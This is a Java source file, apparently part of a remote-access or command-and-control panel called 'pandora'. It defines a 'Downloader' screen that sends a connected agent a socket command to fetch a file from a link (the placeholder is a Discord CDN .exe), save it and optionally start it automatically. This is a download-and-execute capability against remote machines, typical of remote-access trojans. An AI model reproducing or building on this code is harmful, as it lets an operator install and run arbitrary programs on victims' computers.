package org.pandora.master.scene.impl.agent;


import javafx.geometry.Insets;
import javafx.scene.control.Button;
import javafx.scene.control.CheckBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.Background;
import javafx.scene.layout.BackgroundFill;
import javafx.scene.layout.CornerRadii;
import javafx.scene.paint.Color;
import javafx.scene.shape.Line;
import org.pandora.master.Master;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.builder.impl.scene.ControllerBuilder;
import org.pandora.master.data.agent.AgentData;
import org.pandora.master.utils.TimeUtils;

public class Downloader {

    private final Master master;
    private final AnchorPane anchorPane;
    private final BuilderManager builderManager;
    private final AgentData agentData;

    public Downloader(final ControllerBuilder controllerBuilder) {
        this.master = controllerBuilder.getMaster();
        this.anchorPane = controllerBuilder.getAnchorPane();
        this.builderManager = controllerBuilder.getBuilderManager();
        this.agentData = controllerBuilder.getAgentData();
    }

    public void open() {
        this.anchorPane.setBackground(new Background(new BackgroundFill(Color.rgb(26, 27, 36), CornerRadii.EMPTY, Insets.EMPTY)));

        final Label defaultLabel = this.builderManager.getLabelBuilder().buildLabel("Downloader | " + this.agentData.getUser() + "@" + this.agentData.getAddress(), 52, 25, Color.rgb(230, 230, 230), "Consolas", 16);
        final Line line = this.builderManager.getBasicLineBuilder().buildSimpleLine(Color.WHITE, 40, 75, 685, 75);

        final Label linkLabel = this.builderManager.getLabelBuilder().buildLabel("Direct Download Link", 52, 102, Color.rgb(189, 190, 207), "Verdana", 13);
        final Label osLabel = this.builderManager.getLabelBuilder().buildLabel("OS Full Name", 52, 152, Color.rgb(189, 190, 207), "Verdana", 13);
        final Label autoStartLabel = this.builderManager.getLabelBuilder().buildLabel("Automatically start program", 52, 202, Color.rgb(189, 190, 207), "Verdana", 13);
        final Label locationLabel = this.builderManager.getLabelBuilder().buildLabel("Download Location (can be blank)", 52, 252, Color.rgb(189, 190, 207), "Verdana", 13);

        final TextField linkField = this.builderManager.getTextFieldBuilder().buildTextField("", "https://cdn.discordapp.com/attachments/x/x/x.exe", 290, 95, 360, 32);
        final TextField osField = this.builderManager.getTextFieldBuilder().buildTextField(this.agentData.getOs(), "Linux", 290, 148, 220, 32);
        final CheckBox autoStartBox = this.builderManager.getCheckBoxBuilder().buildCheckBox(290, 202);
        final TextField locationField = this.builderManager.getTextFieldBuilder().buildTextField("", "/home/user/Desktop/", 290, 245, 223, 32);

        final Button button = this.builderManager.getButtonBuilder().buildButton(null, "Start Download", 52, 332, "WHITE", "Verdana", 12, 150, 32, "agent-download-button");
        final Label infoLabel = this.builderManager.getLabelBuilder().buildLabel("", 230, 343, Color.rgb(230, 230, 230), "Consolas", 14);

        osField.setDisable(true);
        autoStartBox.setId("agent-autostart-box");
        linkField.setId("agent-download-field");
        locationField.setId("agent-download-field");
        osField.setId("agent-download-field");

        button.setOnMouseClicked(event -> {
            final String link = linkField.getText();
            final String location = locationField.getText().equals("") ? "null" : locationField.getText();
            if (link.equals("")) {
                infoLabel.setText("Please fill in the 'direct download link' field");
                return;
            }
            this.master.getSocketUtils().write(this.agentData.getId(), "downloader:" + link.replace(":", "(doubleDot)") + ":" + autoStartBox.isSelected() + ":" + location.replace(":", "(doubleDot)"));
            infoLabel.setText("Successfully sent the download request to " + this.agentData.getUser() + " at " + TimeUtils.getSimpleHour());
        });

        this.anchorPane.getChildren().addAll(defaultLabel, line, linkLabel, linkField, osLabel, osField, button, locationLabel, autoStartBox, autoStartLabel, locationField, infoLabel);
    }
}
